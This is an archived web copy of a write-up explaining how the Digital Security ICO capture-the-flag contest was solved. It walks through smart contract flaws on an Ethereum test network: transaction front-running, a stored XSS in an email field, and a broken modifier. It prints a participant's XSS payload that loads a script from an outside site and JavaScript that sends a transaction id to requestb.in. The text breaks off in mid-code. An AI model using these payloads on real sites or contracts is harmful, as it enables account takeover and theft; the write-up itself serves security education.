<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of the quest Digital Security ICO</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Before the annual ZeroNights 2017 conference, in addition to Hackquest 2017 , we decided to organize another contest, namely, to hold our ICO (Initial...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of the quest Digital Security ICO</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/zm/eq/vb/zmeqvbfuaf5kulopjivifoxhh6g.jpeg"></p><br><p>  Before the annual ZeroNights 2017 conference, in addition to <a href="https://habrahabr.ru/company/dsec/blog/342224/">Hackquest 2017</a> , we decided to organize another contest, namely, to hold our ICO (Initial coin offering).  But not the same as everyone used to see, but for hackers.  And how could we understand that they are <em>hackers</em> ?  They had to hack ICO!  For details, I ask under the cat. </p><a name="habracut"></a><br><p>  For starters - the legend. </p><br><blockquote>  <a href="http://ico.dsec.ru/">Digital Security ICO</a> follows the whitelist ICO principle, i.e.  Only participants who were on the white list could invest.  The selection of participants took place manually by the owners of the smart contract, based on the data that was provided - a link to a personal blog, twitter, nickname, etc.  If necessary, it was necessary to confirm the identity.  We also gave a chance to a random participant to get his lottery review every five blocks.  In more detail you can familiarize yourself with the conditions and possibilities by reading the <a href="https://rinkeby.etherscan.io/address/0xd80cc3550da18313af09fbd35571084913cd5246">smart contract</a> . </blockquote><p>  The task of the project participants was as follows: </p><br><blockquote>  Get more than 31337 HACK and send a request for an invite to ZeroNights. </blockquote><p>  And this is how the part where the whitelist bids were displayed, the whitelist itself and the cherished button ‚Äúthat the owner had to press‚Äù looked like this. </p><br><p><img src="https://habrastorage.org/webt/jo/ym/mp/joymmpix3mkgbijeypy_gmyxbdc.png"></p><br><h2 id="etap-pervyy-podacha-zayavki">  Stage one.  Filing an application </h2><br><p>  If we analyze the provided links to etherscan.io, then the following smart contraction architecture appears: </p><br><ul><li>  <a href="https://rinkeby.etherscan.io/address/0x9993ae26affd099e13124d8b98556e3215214e81">contract</a> providing HACK coin - standard ERC20 token, nothing superfluous except for a pair of modifiers </li><li>  <a href="https://rinkeby.etherscan.io/address/0xd80cc3550da18313af09fbd35571084913cd5246">ICO contract</a> , which concentrates all the logic of selling tokens and lotteries. </li></ul><br><p>  After reading the ICO, it becomes obvious that you simply do not submit an application for consideration to the owner: </p><br><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">proposal</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(string _email)</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">public</span></span></span><span class="hljs-function"> { //        1337  </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">require</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(msg.sender.balance &gt; 1337 ether &amp;&amp; msg.sender != controller)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">desires</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[msg.sender]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">email</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">_email</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">desires</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[msg.sender]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">active</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">true</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Proposal</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(msg.sender, _email)</span></span></span><span class="hljs-function">; }</span></span></code> </pre> <br><p>  Where to take so many ethers?  The first thing that can come to mind is to keep one's mind!  There is a test network, there should be a few participants ... But no.  The Prok <a href="https://github.com/paritytech/parity/wiki/Proof-of-Authority-Chains">-of-Authority</a> consensus is used in the Rinkbey network, so only the selected nodes may mine and <a href="https://faucet.rinkeby.io/">distribute</a> the broadcast to everyone.  So one of the options was to build accounts on Twitter, Google+, github.com and collect the required amount of broadcast.  According to calculations, having a little more than a hundred accounts, it was possible to collect such an amount per day.  If any of the participants reading the analysis, resorted to such a decision - write in the comments, we are interested in your experience. </p><br><p>  Those who found such an option boring, could notice in the description (or contract) that there is some kind of lottery, which every five blocks provides an opportunity for anyone to apply.  All that is needed is to guess the number that the lottery <a href="https://github.com/pertsev/web3_utilz/tree/master/lotteryRobot">robot made</a> . <br>  The function of the smart contract that the robot called is as follows: </p><br><pre> <code class="hljs cs">address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> robotAddress; mapping (address =&gt; <span class="hljs-keyword"><span class="hljs-keyword">uint</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> playerNumber; address[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> players; <span class="hljs-keyword"><span class="hljs-keyword">uint</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> lotteryBlock; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">event</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">NewLotteryBet</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">address who</span></span></span><span class="hljs-function">)</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">event</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">NewLotteryRound</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> blockNumber</span></span></span><span class="hljs-function">)</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spinLottery</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint</span></span></span></span><span class="hljs-function"><span class="hljs-params"> number</span></span></span><span class="hljs-function">) </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (msg.sender != robotAddress) { playerNumber[msg.sender] = number; players.push(msg.sender); NewLotteryBet(msg.sender); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { require(block.number - lotteryBlock &gt; <span class="hljs-number"><span class="hljs-number">5</span></span>); lotteryBlock = block.number; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">uint</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; players.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (playerNumber[players[i]] == number) { desires[players[i]].active = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; desires[players[i]].email = <span class="hljs-string"><span class="hljs-string">"*Use changeEmail func to set your email.*"</span></span>; Proposal(players[i], desires[players[i]].email); } } delete players; <span class="hljs-comment"><span class="hljs-comment">// flushing round NewLotteryRound(lotteryBlock); } }</span></span></code> </pre> <br><p>  It was assumed that the participants for five blocks send their numbers, and then the robot sends the one that he made.  The smart contract had to check if any of the players guessed.  If successful, the participant went to <code>desires</code> .  It would seem that from the point of view of the smart contract there are no vulnerabilities: the robot closed the round with its transaction and it was possible to see what number it was, only after the fact.  But actually not. </p><br><h3 id="reshenie-pervogo-etapa">  Solution of the first stage </h3><br><p>  In order to find out what number the robot made, and - most importantly - to send a transaction before it, it was necessary to understand how these transactions are processed by the network.  In short: <br>  all new transactions first fall into the pool of unconfirmed (common to all network participants), and the miners, when forming the next block, recruit transactions for themselves from there.  But not in the order in which they were sent, but in descending order of the commission and sequence number of the transaction - gasPrice and nonce, respectively (in fact, the price of "gas" is only one of the components of the commission that the miner receives; the second is spent <a href="http://solidity.readthedocs.io/en/develop/introduction-to-smart-contracts.html">gas</a> ). <br>  Thus, all that was needed was to look at the number that the robot sent while the transaction was still in the unconfirmed pool, and send it along with it with the same number, but at a higher price of "gas".  Taking into account that finding a new block takes 12-30 seconds, the attacker had enough time to rotate the Front-running attack.  An example of an exploit can be explored <a href="">here</a> . </p><br><p>  (Lyrical digression) If any Internet provider participated in the contest and had the opportunity to conduct BGP hijacking attacks, by analogy with those described <a href="https://btc-hijack.ethz.ch/">here</a> , then it could also manage the order of transactions. </p><br><h2 id="etap-vtoroy-zhmi-na-knopku---poluchish-rezultat">  Stage Two.  Click on the button - you will get the result </h2><br><p>  So, the application is filed.  <em>It remains only to wait until the owner adds me to the white list and I can buy the coveted HACK-koin</em> .  It sounds boring, isn't it?  Maybe there is a way to somehow get on the white list?  We look into the contract: </p><br><pre> <code class="hljs matlab">modifier onlyController { require(msg.sender == controller); _; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addParticipant</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address who)</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onlyController</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">public</span></span></span><span class="hljs-function"> { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(isDesirous(who)</span></span></span><span class="hljs-function"> &amp;&amp; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">who</span></span></span><span class="hljs-function"> != </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">controller</span></span></span><span class="hljs-function">) { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">whitelist</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[who]</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">true</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">delete</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">desires</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[who]</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AddParticipant</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(who)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">RemoveProposal</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(who)</span></span></span><span class="hljs-function">; } }</span></span></code> </pre> <br><p>  The <code>addParticipant</code> function, which is called when the button of the same name is clicked in the web interface, has the <code>onlyController</code> modifier <code>onlyController</code> , so to call it, you must sign the transaction with the private key of the <code>controller</code> address.  Or maybe, in the absence of such, to replace the owner himself?  Studying the source code of one of the inherited contracts, <code>Controlled</code> , you can see that there is a change of ownership through the <code>changeController</code> function: </p><br><pre> <code class="hljs pgsql">contract Controlled { /// @<span class="hljs-keyword"><span class="hljs-keyword">notice</span></span> The address <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> the controller <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">only</span></span> address that can <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> /// a <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> this modifier modifier onlyController { require(msg.sender == controller); _; } address <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> controller; <span class="hljs-type"><span class="hljs-type">bool</span></span> isICOdeployed; <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> Controlled() <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> { controller = msg.sender; } /// @<span class="hljs-keyword"><span class="hljs-keyword">notice</span></span> Changes the controller <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> the contract just once /// @param _newController The <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> controller <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> the contract (eg ICO contract) <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> changeController(address _newController) <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> onlyController { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!isICOdeployed) { isICOdeployed = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; controller = _newController; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> revert(); } }</code> </pre> <br><p>  In fact, the function is relevant only for the HACK-koin smart contact (to completely change the controller from the developer‚Äôs address to the ICO contract address), but since the <code>Controlled</code> contract is useful and inherited by both contracts, <code>changeOwner</code> will have <code>changeOwner</code> .  <a href="https://rinkeby.etherscan.io/tx/0x44bbdf14ba0ae62f3b025b25928588bd6cd46e41703a9ef100087e04dbd598da">Trying?</a>  Failure: (The developer provided for this and <a href="https://rinkeby.etherscan.io/tx/0x1c96e755d7e764d0e60ce2ddb2f44e6a9cbdb4cc9dfc6112e029c8dfe20955e9">called the</a> function immediately with a delay with its own address. </p><br><p>  After all the theories have been exhausted, it might indeed seem that the owner enters the participants with a whitelist manually.  But this, of course, is not so. </p><br><h3 id="reshenie-vtorogo-etapa">  Second stage solution </h3><br><p>  To pass the second stage, it was necessary to conduct a blockchain stored XSS attack against the owner.  A hint of this could be seen in the email change function: </p><br><pre> <code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">changeEmail</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(string _email)</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">public</span></span></span><span class="hljs-function"> { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">require</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(desires[msg.sender].active)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">desires</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[msg.sender]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">email</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">_email</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Proposal</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(msg.sender, _email)</span></span></span><span class="hljs-function">; }</span></span></code> </pre> <br><p>  Did you notice?  There are no checks on what is contained in the <code>_email</code> line.  They are not mainly because doing such checks is expensive (spent gas), and there are no built-in functions for working with strings.  It turns out that the only barrier of protection will most likely be implemented on the client side.  Let's take a look at how to add email to the Statistic page: </p><br><pre> <code class="html hljs xml"><span class="hljs-comment"><span class="hljs-comment">&lt;!--      statistics.vue --&gt;</span></span> ... <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"table__proposals"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span>Proposals<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"table__body"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"table__item"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">v-for</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"member in desires"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">v-on:click.capture</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"selected = member"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">v-bind:class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"{ selected: selected == member}"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--  v-html -      --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"member__email"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">v-html</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"member.email"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--   --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span>{{ member.address }}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> ...</code> </pre> <br><p>  Of course, the participants have already seen the rendered option.  But nothing prevented the experiment: </p><br><ol><li>  The ABI data of the smart contract and its address were pulled up by the front-end with a separate request, so you could use proxies like Burp Suite to replace them with your own. </li><li>  The source of the smart contract lay on etherscan.io - it was possible to expand the private blockchain, deploy the smart contract there and experiment. </li></ol><br><p>  From the point of view of competition, it is also important to come already with a working attack vector, since everyone in the blockchain can see the actions of rivals! </p><br><p>  Here is the first vector sent: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">the</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.last</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.triarius</span></span>@<span class="hljs-keyword"><span class="hljs-keyword">gmail</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">com</span></span>&lt;<span class="hljs-keyword"><span class="hljs-keyword">img</span></span> src=<span class="hljs-string"><span class="hljs-string">"1"</span></span> onerror=<span class="hljs-string"><span class="hljs-string">"var x = document.createElement('script'); x.src = 'http://yourjavascript.com/112951702413/h.js'; document.getElementsByTagName('head')[0].appendChild(x);"</span></span>&gt;</code> </pre> <br><p>  In most cases, the payload was pulled up separately (and I didn‚Äôt even try to follow these links and see what was there), but here‚Äôs an example: </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> xhr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> XMLHttpRequest(); xhr.open(<span class="hljs-string"><span class="hljs-string">'GET'</span></span>, <span class="hljs-string"><span class="hljs-string">'/static/contracts.json'</span></span>, <span class="hljs-literal"><span class="hljs-literal">false</span></span>); xhr.send(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> contracts = <span class="hljs-built_in"><span class="hljs-built_in">JSON</span></span>.parse(xhr.responseText); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ico_addr = contracts.ICO_CONTRACT_ADDRESS; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ico_abi = contracts.ICO_CONTRACT_ABI; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ico = web3.eth.contract(ico_abi).at(ico_addr); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> player_addr = <span class="hljs-string"><span class="hljs-string">'0xc24c2841b87694e546a093ac0da6565c8fdd1800'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> tx = ico.addParticipant(player_addr, {<span class="hljs-attr"><span class="hljs-attr">from</span></span>: web3.eth.coinbase}) xhr.open(<span class="hljs-string"><span class="hljs-string">'GET'</span></span>, <span class="hljs-string"><span class="hljs-string">'https://requestb.in/1gz0iz11?tx='</span></span>+tx, <span class="hljs-literal"><span class="hljs-literal">false</span></span>); xhr.send();</code> </pre> <br><p>  It is also worth noting that the attack was successful because the owner uses the geth client with a unlocked coinbase account.  If any wallet were used, then at the initiation of the transaction the user would see a window that requires confirmation of the transaction.  However, you should not assume that using the wallet will save you from all ills.  The attacker can still manage the data from which the transaction is formed (for example, replace the address chosen by the owner with his own). </p><br><h2 id="etap-tretiy-kontrolnaya-zakupka">  Stage Three.  Test purchase </h2><br><p>  Well, we are almost there.  It's time to buy 31337 HACK-koinov.  We look at the purchase function: </p><br><pre> <code class="hljs lua">// - ICO uint RATE = <span class="hljs-number"><span class="hljs-number">2500</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">buy</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span> public payable { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isWhitelisted(msg.sender)) { uint hacks = RATE * msg.value; <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(hack.balanceOf(msg.sender) + hacks &lt;= <span class="hljs-number"><span class="hljs-number">1000</span></span> ether); hack.mint(hacks, msg.sender); } }</code> </pre> <br><p>  On the move, it is clear that a smart contract does not allow you to purchase more than 1000 HACK-coins, but you need more than 31337. However, it does not matter!  Notice how the check of the balance of the buyer.  Only current balance is taken into account!  The logical solution would be to simply transfer the coins somewhere else and buy again. </p><br><h3 id="reshenie-tretego-etapa">  Solution of the third stage </h3><br><p>  See how you can make a transfer: </p><br><pre> <code class="hljs matlab">modifier afterICO() { block.timestamp &gt; November15_2017; _; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">transfer</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _to, uint256 _value)</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">afterICO</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bool)</span></span></span><span class="hljs-function"> { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">balances</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[msg.sender]</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">balances</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[msg.sender]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sub</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(_value)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">balances</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[_to]</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">balances</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[_to]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">add</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(_value)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Transfer</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(msg.sender, _to, _value)</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">return</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">true</span></span></span><span class="hljs-function">; }</span></span></code> </pre> <br><p>  The function is for translation, but a modifier is given to it, which should limit the possibility of calling it before the end of the ICO.  However, in reality, the modifier does not fulfill its function regardless of the condition, since this very condition still needs to be processed.  Here is the correct option: </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">afterICO</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { require(block.timestamp &gt; November15_2017); _; }</code> </pre> <br><p>  Thus, you can repeat the operation "purchase-withdrawal" 13 times and accumulate the coveted number of tokens.  Another option is to use the <code>transferFrom</code> function - the process is a bit more complicated, but also working. </p><br><h2 id="bonusnyy-etap-off-chain-transaction">  Bonus stage.  Off-chain transaction </h2><br><p>  This is a bonus stage, because I didn‚Äôt think about it as a stage at all, but I made many googling seriously, and after passing send an emotional feedback along with the flag (as part of decency, of course).  So, the signature to the form on the site reads: </p><br><blockquote>  ... To get an entrance ticket, collect more than 31337 HACK Coins and send us a signed off-chain transaction with "HACK" as msg.data. </blockquote><p>  For the transfer of the flag, it was required off-chain interaction with the participants (that is, outside the Ethereum network).  Since the invitation could be received in exchange for the flag (secret), and keeping secrets in the blockchain is not easy - even if you encrypt the flag, how to give the key to the correct participant?  Actually, therefore, we asked the participant to generate a signed transaction from the address where there is the necessary number of HACK-koins and send it to the backend ico.dsec.ru, and not to the network.  Here is a detailed <a href="">example of</a> how to generate such a transaction. </p><br><div class="spoiler">  <b class="spoiler_title">But the code from the backend that processes this byte sequence</b> <div class="spoiler_text"><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Tx = <span class="hljs-built_in"><span 